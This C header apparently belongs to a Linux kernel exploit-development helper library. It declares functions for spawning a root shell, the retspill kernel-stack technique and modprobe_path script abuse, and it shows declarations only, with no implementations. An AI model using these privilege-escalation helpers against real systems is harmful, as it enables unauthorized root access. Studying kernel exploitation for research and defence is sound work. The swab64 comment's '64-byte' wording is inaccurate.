struct syscall_regs {
  /*
   * mimics the kernel stack used to store register values when a syscall is
   * invoked
   */
#if defined(__x86_64__)
  unsigned long r15;
  unsigned long r14;
  unsigned long r13;
  unsigned long r12;
  unsigned long rbp;
  unsigned long rbx;
  unsigned long eflags;
  unsigned long r10;
  unsigned long r9;
  unsigned long r8;
  unsigned long rax;
  unsigned long rip;
  unsigned long rdx;
  unsigned long rsi;
  unsigned long rdi;
  unsigned long orig_rax;
  unsigned long _rip;
  unsigned long cs;
  unsigned long _eflags;
  unsigned long rsp;
  unsigned long ss;
#endif
};

/*
 * Checks if root (uid = 0). If so, it gets a shell; otherwise, it throws an
 * error.
 */
void shell();

/*
 * Registers a segfault handler to get a shell then segfaults
 */
void crash();

/*
 * Pins CPU to core_id
 */
void pin_cpu(int core_id);

/*
 * Performs retspill with given register values
 *  This function is currently only supported on x86-64
 *
 * @regs: the register values to store on the kernel stack
 */
void retspill(struct syscall_regs *regs);

/*
 * Writes the #!/bin/sh header and `cmd` to `path` with permission set to 777
 *
 */
int setup_modprobe(char *path, char *cmd);

/*
 * Runs modprobe path
 */
int run_modprobe();

/*
 * Flushes the TLB entries corresponding to the memory region [addr, addr+len)
 *
 * @addr: address to flush
 * @len: size of the memory region to be flushed from the TLB
 */
void flush_tlb(void *addr, long len);

/*
 * Prevents exploits from running unintentionally when the NO_KPINIT_EXPLOIT
 * environment variable is set
 */
static void __no_kpinit_exploit(void);

/*
 * Reverses the order of a 64-byte number
 */
#define swab64(x)                                                              \
  ((ulong)((((ulong)(x) & (ulong)0x00000000000000ffULL) << 56) |               \
           (((ulong)(x) & (ulong)0x000000000000ff00ULL) << 40) |               \
           (((ulong)(x) & (ulong)0x0000000000ff0000ULL) << 24) |               \
           (((ulong)(x) & (ulong)0x00000000ff000000ULL) << 8) |                \
           (((ulong)(x) & (ulong)0x000000ff00000000ULL) >> 8) |                \
           (((ulong)(x) & (ulong)0x0000ff0000000000ULL) >> 24) |               \
           (((ulong)(x) & (ulong)0x00ff000000000000ULL) >> 40) |               \
           (((ulong)(x) & (ulong)0xff00000000000000ULL) >> 56)))
